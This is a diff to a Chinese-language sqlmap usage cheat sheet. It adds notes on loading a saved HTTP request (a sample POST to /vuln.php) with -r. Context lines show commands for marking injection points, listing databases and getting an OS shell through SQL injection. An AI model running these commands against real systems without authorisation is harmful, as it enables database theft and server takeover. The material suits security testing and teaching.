@@ -50,6 +50,19 @@
 --user-agent "Mozilla/5.0 (Linux; U; Android 2.2; en-us; Droid Build/FRG22D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
 ```
 
+### 常用参数 - 读取HTTP request文本
+
+sqlmap `-r reqfile.txt` 会自动分析该请求包（如cookie，POST数据 等），可充分测试各处，避免用命令行设置User-Agent等参数
+
+`reqfile.txt`的格式：
+```
+POST /vuln.php HTTP/1.1
+Host: www.target.com
+User-Agent: Mozilla/4.0
+
+id=1
+```
+
 ### 常用参数 - 用*标记注入点
 
 针对情况：伪静态 等不识别的格式
@@ -63,6 +76,7 @@ sqlmap -u xxx.com/index.php/Index/view/id/40*.html --dbs
 ### 参数 - OS命令执行
 
 前提1：数据库为MySQL/PostgreSQL/Microsoft SQL Server
+
 前提2：当前用户有权限使用特定的函数. 在sqlmap中查看权限用 `--privileg`
 
 --os-shell=whoami
